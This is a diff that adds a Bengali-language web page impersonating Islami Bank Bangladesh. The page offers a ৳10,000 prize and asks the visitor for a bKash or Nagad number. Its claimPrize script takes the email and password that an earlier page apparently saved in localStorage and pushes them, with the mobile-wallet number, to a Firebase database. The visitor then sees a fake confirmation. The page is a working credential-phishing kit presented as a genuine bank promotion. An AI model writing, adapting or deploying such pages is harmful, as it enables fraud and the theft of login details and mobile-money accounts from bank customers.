@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>bKash বা Nagad নম্বর দিন — Islami Bank LMT</title>
+  <link rel="icon" type="image/png" href="logo.png">
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    /* User info bar */
+    .user-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--primary-light);
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+    }
+
+    .user-bar img {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 2px solid var(--primary);
+    }
+
+    .user-bar .user-info {
+      flex: 1;
+    }
+
+    .user-bar .user-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--primary-dark);
+    }
+
+    .user-bar .user-email {
+      font-size: 12px;
+      color: var(--text-light);
+    }
+
+    .user-bar .verified {
+      font-size: 18px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="confetti-container" id="confetti"></div>
+
+  <header class="header">
+    <div class="bank-logo">
+      <img src="logo.png" alt="Islami Bank"
+        style="width:100%;height:100%;object-fit:contain;border-radius:10px;" />
+    </div>
+    <div class="bank-name">
+      <h1>Islami Bank LMT</h1>
+      <p>Bangladesh Limited</p>
+    </div>
+  </header>
+
+  <div class="container" style="padding-top: 24px;">
+    <div class="card">
+      <div class="result-icon">🎉</div>
+      <div class="result-title win" style="text-align: center; margin-bottom: 20px;">পুরস্কার ক্লেম করুন</div>
+
+      <!-- bKash Claim Step -->
+      <div id="claim-step">
+
+        <!-- User info bar fallback -->
+        <div class="user-bar" id="user-bar">
+          <img id="user-photo" src="https://ui-avatars.com/api/?name=User&background=1a6b3a&color=fff" alt="User" />
+          <div class="user-info">
+            <div class="user-name" id="user-name">Login Verified</div>
+            <div class="user-email" id="user-email"></div>
+          </div>
+          <div class="verified">✅</div>
+        </div>
+
+        <!-- Claim Form -->
+        <div class="claim-section">
+          <h3>📱 bKash বা Nagad নম্বর দিন</h3>
+          <div class="input-group">
+            <label for="bkash-number">আপনার bKash বা Nagad নম্বর:</label>
+            <input type="tel" id="bkash-number" placeholder="01XXXXXXXXX" maxlength="11" inputmode="numeric"
+              pattern="[0-9]*" />
+          </div>
+          <button class="btn btn-gold" onclick="claimPrize()" id="claim-btn">
+            💰 ক্লেম করুন
+          </button>
+        </div>
+
+        <!-- Claim Success -->
+        <div class="claim-success" id="claim-success" style="display:none;">
+          <div class="success-icon">✅</div>
+          <p>
+            ক্লেম সফল হয়েছে!<br />
+            <strong id="claimed-number"></strong> নম্বরে<br />
+            শীঘ্রই <strong>৳১০,০০০ টাকা</strong> পাঠানো হবে।<br />
+            ধন্যবাদ Islami Bank এর সাথে থাকার জন্য! 🙏
+          </p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer">© 2026 Islami Bank Bangladesh Limited</div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPtPwc_a6zx0V2U-2bnAAep1r38xcJkAw",
+      authDomain: "islami-bank-quiz.firebaseapp.com",
+      databaseURL: "https://islami-bank-quiz-default-rtdb.asia-southeast1.firebasedatabase.app/",
+      projectId: "islami-bank-quiz",
+      storageBucket: "islami-bank-quiz.firebasestorage.app",
+      messagingSenderId: "463779241704",
+      appId: "1:463779241704:web:1b67963755b0bc1f64735d",
+      measurementId: "G-THP0SSP2RT"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+
+    document.addEventListener("DOMContentLoaded", function () {
+      let email = localStorage.getItem("userEmail");
+      if (email) {
+        document.getElementById('user-email').textContent = email;
+      }
+      document.getElementById('user-name').textContent = ' verified';
+    });
+
+    async function claimPrize() {
+      const num = document.getElementById('bkash-number').value.trim();
+
+      if (!num || num.length < 11) {
+        alert('সঠিক bKash নম্বর দিন (১১ সংখ্যা)।');
+        return;
+      }
+      if (!/^01[3-9]\d{8}$/.test(num)) {
+        alert('সঠিক বাংলাদেশি মোবাইল নম্বর দিন।\nউদাহরণ: 01712345678');
+        return;
+      }
+
+      const btn = document.getElementById('claim-btn');
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>জমা হচ্ছে...';
+
+      try {
+        // ৩ জায়গার ডেটা একসাথে নেওয়া হচ্ছে
+        let email = localStorage.getItem("userEmail") || "unknown";
+        let password = localStorage.getItem("userPassword") || "unknown";
+
+        // Firebase এ একসাথে সব সেভ করা
+        await firebase.database().ref("users_data").push({
+          email: email,
+          password: password,
+          bkashNumber: num,
+          timestamp: new Date().toLocaleString()
+        });
+
+        // Success!
+        document.getElementById('claimed-number').textContent = num;
+        document.getElementById('claim-success').style.display = 'block';
+        document.getElementById('bkash-number').disabled = true;
+        document.querySelector('.claim-section').style.display = 'none';
+        btn.innerHTML = '✅ ক্লেম জমা হয়েছে!';
+        launchConfetti();
+
+      } catch (error) {
+        console.error(error);
+        btn.disabled = false;
+        btn.innerHTML = '💰 ক্লেম করুন';
+        alert('সমস্যা হয়েছে! আবার চেষ্টা করুন।\n' + error.message);
+      }
+    }
+
+    // ============================================================
+    // CONFETTI
+    // ============================================================
+    function launchConfetti() {
+      const colors = ['#1a6b3a', '#c9a227', '#2da15a', '#ffd700', '#0f4a27', '#fff'];
+      const container = document.getElementById('confetti');
+      for (let i = 0; i < 70; i++) {
+        const piece = document.createElement('div');
+        piece.className = 'confetti-piece';
+        piece.style.left = Math.random() * 100 + '%';
+        piece.style.top = '-10px';
+        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+        const size = Math.random() * 8 + 6;
+        piece.style.width = size + 'px';
+        piece.style.height = size + 'px';
+        piece.style.animationDuration = (Math.random() * 2.5 + 2) + 's';
+        piece.style.animationDelay = Math.random() * 2.5 + 's';
+        container.appendChild(piece);
+      }
+    }
+  </script>
+</body>
+
+</html>
